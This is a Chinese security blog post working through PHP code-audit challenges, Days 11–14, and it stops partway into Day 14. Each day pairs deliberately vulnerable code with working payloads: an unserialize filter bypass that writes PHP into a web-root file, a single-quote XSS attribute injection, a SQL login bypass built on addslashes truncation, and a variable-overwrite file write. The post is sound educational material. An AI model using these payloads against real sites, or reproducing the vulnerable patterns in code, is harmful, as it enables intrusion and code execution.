<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="PHP代码审计(二)"><meta name="keywords" content="PHP"><meta name="author" content="Sys71m"><meta name="copyright" content="Sys71m"><title>PHP代码审计(二) | sys71m</title><link rel="shortcut icon" href="/lufei.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><link rel="alternate" href="/atom.xml" title="sys71m" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-11-Pumpkin-Pie"><span class="toc-number">1.</span> <span class="toc-text">Day 11 - Pumpkin Pie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-12-String-Lights"><span class="toc-number">2.</span> <span class="toc-text">Day 12 - String Lights</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-1"><span class="toc-number">2.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-13-Turkey-Baster"><span class="toc-number">3.</span> <span class="toc-text">Day 13 - Turkey Baster</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-2"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-2"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-2"><span class="toc-number">3.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-14-Snowman"><span class="toc-number">4.</span> <span class="toc-text">Day 14 - Snowman</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-3"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-3"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-3"><span class="toc-number">4.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-15-Sleigh-Ride"><span class="toc-number">5.</span> <span class="toc-text">Day 15 - Sleigh Ride</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-4"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-4"><span class="toc-number">5.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-4"><span class="toc-number">5.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-16-Poem"><span class="toc-number">6.</span> <span class="toc-text">Day 16 - Poem</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-5"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-5"><span class="toc-number">6.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-5"><span class="toc-number">6.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-17-Mistletoe"><span class="toc-number">7.</span> <span class="toc-text">Day 17 - Mistletoe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-6"><span class="toc-number">7.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-6"><span class="toc-number">7.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-6"><span class="toc-number">7.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-18-Sign"><span class="toc-number">8.</span> <span class="toc-text">Day 18 - Sign</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-7"><span class="toc-number">8.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-7"><span class="toc-number">8.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-7"><span class="toc-number">8.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-19-Birch"><span class="toc-number">9.</span> <span class="toc-text">Day 19 - Birch</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-8"><span class="toc-number">9.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-8"><span class="toc-number">9.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-8"><span class="toc-number">9.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-20-Stocking"><span class="toc-number">10.</span> <span class="toc-text">Day 20 - Stocking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-9"><span class="toc-number">10.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-9"><span class="toc-number">10.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-9"><span class="toc-number">10.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-21-Gift-Wrap"><span class="toc-number">11.</span> <span class="toc-text">Day 21 - Gift Wrap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-10"><span class="toc-number">11.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-10"><span class="toc-number">11.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-10"><span class="toc-number">11.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-22-Chimney"><span class="toc-number">12.</span> <span class="toc-text">Day 22 - Chimney</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-11"><span class="toc-number">12.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-11"><span class="toc-number">12.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-11"><span class="toc-number">12.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-23-Cookies"><span class="toc-number">13.</span> <span class="toc-text">Day 23 - Cookies</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-12"><span class="toc-number">13.1.</span> <span class="toc-text">漏洞代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-12"><span class="toc-number">13.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证-12"><span class="toc-number">13.3.</span> <span class="toc-text">漏洞验证</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-24-Nutcracker"><span class="toc-number">14.</span> <span class="toc-text">Day 24 - Nutcracker</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-13"><span class="toc-number">14.1.</span> <span class="toc-text">漏洞代码</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://raw.githubusercontent.com/ttonys/gitPic/master/lufei.jpg"></div><div class="author-info__name text-center">Sys71m</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/ttonys">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">33</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">48</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">18</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://raw.githubusercontent.com/ttonys/MarkDownPic/master/test33.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">sys71m</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">PHP代码审计(二)</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-14</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/代码审计/">代码审计</a><span class="post-meta__separator">|</span><i class="fa fa-comment-o post-meta__icon" aria-hidden="true"></i><a href="/2020/02/14/PHP代码审计(二)/#disqus_thread"><span class="disqus-comment-count" data-disqus-identifier="2020/02/14/PHP代码审计(二)/"></span></a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">4.4k</span><span class="post-meta__separator">|</span><span>Reading time: 19 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>RIPS Technologies2017代码审计的第二篇。</p>
<a id="more"></a>  
<h2 id="Day-11-Pumpkin-Pie"><a href="#Day-11-Pumpkin-Pie" class="headerlink" title="Day 11 - Pumpkin Pie"></a>Day 11 - Pumpkin Pie</h2><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $cacheFile = <span class="string">'/tmp/cachefile'</span>;</span><br><span class="line">  <span class="keyword">public</span> $template = <span class="string">'&lt;div&gt;Welcome back %s&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data = null)</span> </span>&#123;</span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;loadData($data);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;render($data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span> &amp;&amp; !preg_match(<span class="string">'/O:\d:\/'</span>, $data)) &#123;</span><br><span class="line">      <span class="keyword">return</span> unserialize($data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> [];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCache</span><span class="params">($file = null, $tpl = null)</span> </span>&#123;</span><br><span class="line">    $file = $file ?? <span class="keyword">$this</span>-&gt;cacheFile;</span><br><span class="line">    $tpl = $tpl ?? <span class="keyword">$this</span>-&gt;template;</span><br><span class="line">    file_put_contents($file, $tpl);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(</span><br><span class="line">      <span class="keyword">$this</span>-&gt;template,</span><br><span class="line">      htmlspecialchars($data[<span class="string">'name'</span>])</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;createCache();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Template($_COOKIE[<span class="string">'data'</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码中需要修改的一点：正则<code>/O:\d:\/</code>改为<code>/O:\d:/</code>。</p>
<p>代码中存在反序列化的点，但反序列化前进行了过滤，开头的前两位必须不为<code>O:8</code>，并且不许存在<code>O:数字:</code>这样的序列化数据存在。先说一下这样过滤的意义，在php的序列化数据中，a代表array，s代表string，b代表bool，而数字代表个数/长度，o代表一个对象。因此这样就无法对已经序列化的对象进行反序列化，从而预防了任意对象反序列化的危害。</p>
<p>但是对于第一个过滤，可以采用数组的方式绕过，测试如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$test=<span class="keyword">array</span>(<span class="string">"user"</span>=&gt;<span class="number">1</span>,<span class="string">"pass"</span>=&gt;<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> var_dump(serialize($test));</span><br><span class="line"><span class="comment">#string'a : 2 :&#123;s : 4 : "user" ; i : 1 ; s : 4 : "pass" ; i : 1 ;&#125;</span></span><br></pre></td></tr></table></figure>
<p>对于第二个过滤规则，只需要在对象长度前添加一个+号，原理参考如下文章：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://www.phpbug.cn/archives/32.html</span></span><br></pre></td></tr></table></figure>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'/var/www/html/config.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;?php phpinfo();?&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$mytemp = <span class="keyword">new</span> Template();</span><br><span class="line">$myarray = <span class="keyword">array</span>(<span class="string">'name'</span>=&gt;<span class="string">'test'</span>,$mytemp);</span><br><span class="line">$myarray = serialize($myarray);</span><br><span class="line">var_dump($myarray);</span><br><span class="line"><span class="comment">#a:2:&#123;s:4:"name";s:4:"test";i:0;O:8:"Template":2:&#123;s:9:"cacheFile";s:22:"/var/www/html/info.php";s:8:"template";s:16:"&lt;?php phpinfo();";&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>需要将<code>0:8</code>变为<code>0:+8</code></p>
<h2 id="Day-12-String-Lights"><a href="#Day-12-String-Lights" class="headerlink" title="Day 12 - String Lights"></a>Day 12 - String Lights</h2><h3 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$sanitized = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">  $sanitized[$key] = intval($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$queryParts = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> $key . <span class="string">'='</span> . $value;</span><br><span class="line">&#125;, array_keys($sanitized), array_values($sanitized));</span><br><span class="line"></span><br><span class="line">$query = implode(<span class="string">'&amp;'</span>, $queryParts);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href='/images/size.php?"</span> .</span><br><span class="line">  htmlentities($query) . <span class="string">"'&gt;link&lt;/a&gt;"</span>;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码中对输入的字符进行处理后最终反馈到前端页面上，其中对value进行了<code>intval</code>处理，但忽略了对key的处理，接下来重要的就是要绕过<code>htmlentities</code>，手册上解释如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(&quot;default_charset&quot;) [, bool $double_encode = true ]]] ) : string</span><br><span class="line">本函数各方面都和 htmlspecialchars() 一样， 除了 htmlentities() 会转换所有具有 HTML 实体的字符。</span><br><span class="line"></span><br><span class="line">如果要解码（反向操作），可以使用 html_entity_decode()。</span><br></pre></td></tr></table></figure>
<p><code>htmlentities</code>默认情况下不会对单引号进行转义。</p>
<h3 id="漏洞验证-1"><a href="#漏洞验证-1" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a%27onclick%3Dalert%281%29%2f%2f=1</span><br></pre></td></tr></table></figure>
<h2 id="Day-13-Turkey-Baster"><a href="#Day-13-Turkey-Baster" class="headerlink" title="Day 13 - Turkey Baster"></a>Day 13 - Turkey Baster</h2><h3 id="漏洞代码-2"><a href="#漏洞代码-2" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginManager</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $em;</span><br><span class="line">  <span class="keyword">private</span> $user;</span><br><span class="line">  <span class="keyword">private</span> $password;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $password)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $user = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;user);</span><br><span class="line">    $pass = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;password);</span><br><span class="line"></span><br><span class="line">    $queryBuilder = <span class="keyword">$this</span>-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">      -&gt;select(<span class="string">"COUNT(p)"</span>)</span><br><span class="line">      -&gt;from(<span class="string">"User"</span>, <span class="string">"u"</span>)</span><br><span class="line">      -&gt;where(<span class="string">"user = '$user' AND password = '$pass'"</span>);</span><br><span class="line">    $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">    <span class="keyword">return</span> boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input, $length = <span class="number">20</span>)</span> </span>&#123;</span><br><span class="line">    $input = addslashes($input);</span><br><span class="line">    <span class="keyword">if</span> (strlen($input) &gt; $length) &#123;</span><br><span class="line">      $input = substr($input, <span class="number">0</span>, $length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = <span class="keyword">new</span> LoginManager($_POST[<span class="string">'user'</span>], $_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"><span class="keyword">if</span> (!$auth-&gt;isValid()) &#123;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码中通过<code>addslashes</code>函数试图阻止sql危害的产生，函数解释如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addslashes ( string $str ) : string</span><br><span class="line">返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（&apos;）、双引号（&quot;）、反斜线（\）与 NUL（NULL 字符）。</span><br></pre></td></tr></table></figure>
<p>代码中对所输入的长度进行了最长为20的限制，利用这个限制，我们可以构造经过转义后长度大于20的字符串，经过<code>substr</code>函数的截断，逃逸出<code>\</code>，测试如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(substr(addslashes(<span class="string">"123456789123456789'"</span>),<span class="number">0</span>,<span class="number">20</span>));</span><br><span class="line">string(<span class="number">20</span>) <span class="string">"123456789123456789\'"</span></span><br><span class="line">php &gt; var_dump(substr(addslashes(<span class="string">"1234567890123456789'"</span>),<span class="number">0</span>,<span class="number">20</span>));</span><br><span class="line">string(<span class="number">20</span>) <span class="string">"1234567890123456789\"</span></span><br></pre></td></tr></table></figure>
<h3 id="漏洞验证-2"><a href="#漏洞验证-2" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>构造如下paylod：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=1234567890123456789&apos;&amp;passwd=or 1=1#</span><br></pre></td></tr></table></figure>
<p>最终在where语句处查询的最终表达式为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user = &apos;1234567890123456789\&apos; AND password = &apos;or 1=1#&apos;</span><br></pre></td></tr></table></figure>
<p>返回结构始终为true。</p>
<h2 id="Day-14-Snowman"><a href="#Day-14-Snowman" class="headerlink" title="Day 14 - Snowman"></a>Day 14 - Snowman</h2><h3 id="漏洞代码-3"><a href="#漏洞代码-3" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Carrot</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> EXTERNAL_DIRECTORY = <span class="string">'/tmp/'</span>;</span><br><span class="line">  <span class="keyword">private</span> $id;</span><br><span class="line">  <span class="keyword">private</span> $lost = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> $bought = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;id = rand(<span class="number">1</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($input <span class="keyword">as</span> $field =&gt; $count) &#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;$field = $count++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    file_put_contents(</span><br><span class="line">      <span class="keyword">self</span>::EXTERNAL_DIRECTORY . <span class="keyword">$this</span>-&gt;id,</span><br><span class="line">      var_export(get_object_vars(<span class="keyword">$this</span>), <span class="keyword">true</span>)</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$carrot = <span class="keyword">new</span> Carrot($_GET);</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>foreach处存在明显的变量覆盖漏洞，因此写入文件的名称以及路径完全可控。</p>
<p>代码中因使用了<code>var_export</code>对对象数组进行了处理，会获取示例的所有的属性，那么我们就可以构造属性进行写入。参数含义如下：</p>
